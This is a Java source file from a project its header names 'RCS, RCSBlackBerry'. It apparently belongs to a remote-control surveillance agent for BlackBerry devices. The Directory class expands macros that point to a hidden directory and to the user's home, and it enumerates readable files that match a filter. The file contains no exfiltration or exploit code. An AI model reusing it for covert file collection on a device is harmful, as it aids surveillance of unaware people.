//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.fs;

import java.io.IOException;
import java.util.Enumeration;

import javax.microedition.io.Connector;
import javax.microedition.io.file.FileConnection;

import net.rim.device.api.util.EmptyEnumeration;
import net.rim.device.api.util.ObjectEnumerator;
import blackberry.Messages;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Utils;

public class Directory {
    //#ifdef DEBUG
    private static Debug debug = new Debug("Directory", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif
    public final static String hiddenDirMacro = Messages.getString("11.0"); //$NON-NLS-1$
    public final static String userProfile = Messages.getString("11.1"); //$NON-NLS-1$

    public static String expandMacro(String file) {
        // expanding $dir$ && $userprofile$

        file = Directory.expandMacro(file, hiddenDirMacro, Path.hidden());
        file = Directory.expandMacro(file, userProfile, Path.home());
        return file;
    }

    private static String expandMacro(String filename, String expand,
            String newdir) {
        final int macro = filename.indexOf(expand, 0);
        String expandedFilter = filename;
        if (macro == 0) {
            //#ifdef DEBUG
            debug.trace("expanding macro"); //$NON-NLS-1$
            //#endif
            //final String first = filter.substring(0, macro);
            final String end = filename.substring(macro + expand.length(),
                    filename.length());
            expandedFilter = Utils.chomp(newdir, "/") + end; //$NON-NLS-1$

            //#ifdef DEBUG
            debug.trace("expandedFilter: " + expandedFilter); //$NON-NLS-1$
            //#endif
        }
        return expandedFilter;
    }

    public static Enumeration find(String filter) {

        //#ifdef DBC
        Check.requires(!filter.startsWith("file://"), //$NON-NLS-1$
                "find filter shouldn't start with file:// : " + filter); //$NON-NLS-1$
        //#endif

        if (filter.indexOf('*') >= 0) {
            //#ifdef DEBUG
            debug.trace("asterisc"); //$NON-NLS-1$
            //#endif

            // filter
            String baseDir = filter.substring(0, filter.lastIndexOf('/'));
            final String asterisc = filter
                    .substring(filter.lastIndexOf('/') + 1);

            if (baseDir == "") { //$NON-NLS-1$
                baseDir = "/"; //$NON-NLS-1$
            }

            FileConnection fconn = null;
            try {
                fconn = (FileConnection) Connector.open("file://" + baseDir, //$NON-NLS-1$
                        Connector.READ);

                if (!fconn.isDirectory() || !fconn.canRead()) {
                    //#ifdef DEBUG
                    debug.error("not a dir or cannot read"); //$NON-NLS-1$
                    //#endif
                    return new EmptyEnumeration();
                }

                return fconn.list(asterisc, true);

            } catch (final IOException ex) {
                //#ifdef DEBUG
                debug.error(ex);
                //#endif
            } finally {
                try {
                    if (fconn != null)
                        fconn.close();
                } catch (IOException e) {
                }
            }
        } else {
            // single file
            //#ifdef DEBUG
            debug.trace("single file"); //$NON-NLS-1$
            //#endif
            FileConnection fconn = null;
            try {
                fconn = (FileConnection) Connector.open("file://" + filter, //$NON-NLS-1$
                        Connector.READ);

                if (!fconn.exists() || fconn.isDirectory() || !fconn.canRead()) {
                    //#ifdef DEBUG
                    debug.error("not exists, a dir or cannot read"); //$NON-NLS-1$
                    //#endif
                    return new EmptyEnumeration();
                }

                return new ObjectEnumerator(new Object[] { fconn });

            } catch (final IOException ex) {
                //#ifdef DEBUG
                debug.error(ex);
                //#endif
                fconn = null;
            } finally {
                try {
                    //#ifdef DEBUG
                    debug.trace("closing"); //$NON-NLS-1$
                    //#endif
                    if (fconn != null)
                        fconn.close();
                } catch (Exception e) {
                }
            }
        }

        //#ifdef DEBUG
        debug.trace("exiting"); //$NON-NLS-1$
        //#endif
        return new EmptyEnumeration();
    }
}
